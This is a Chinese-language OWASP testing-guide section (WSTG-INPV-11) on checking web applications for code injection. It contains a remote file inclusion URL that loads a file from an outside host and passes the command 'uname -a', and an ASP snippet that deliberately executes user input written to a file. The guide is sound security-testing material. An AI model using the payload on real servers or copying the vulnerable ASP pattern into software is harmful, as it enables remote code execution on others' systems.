# 测试代码注入

|ID          |
|------------|
|WSTG-INPV-11|

## 概述

本节描述测试人员如何检查是否有可能在Web页面上输入代码作为输入并由Web服务器执行。

在[代码注入](https://owasp.org/www-community/attacks/Code_Injection)测试中，测试人员提交被Web服务器作为动态代码或包含文件处理的输入。这些测试可以针对各种服务器端脚本引擎，例如ASP或PHP。需要适当的输入验证和安全编码实践来防御这些攻击。

## 测试目标

- 识别可以向应用程序注入代码的注入点。
- 评估注入严重程度。

## 如何测试

### 黑盒测试

#### 测试PHP注入漏洞

使用querystring，测试人员可以注入代码（在此示例中为恶意URL）以作为包含文件的一部分进行处理：

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> 恶意URL被接受为PHP页面的参数，该参数随后将在包含文件中使用该值。

### 灰盒测试

#### 测试ASP代码注入漏洞

检查用于执行函数的用户输入的ASP代码。用户可以在数据输入字段中输入命令吗？这里，ASP代码将输入保存到文件，然后执行它：

```asp
<%
If not isEmpty(Request( "Data" ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>
```

### 参考资料

- [Insecure.org](https://insecure.org/)
- [维基百科](https://www.wikipedia.org)
- [审查代码以防止OS注入](https://wiki.owasp.org/index.php/OS_Injection)
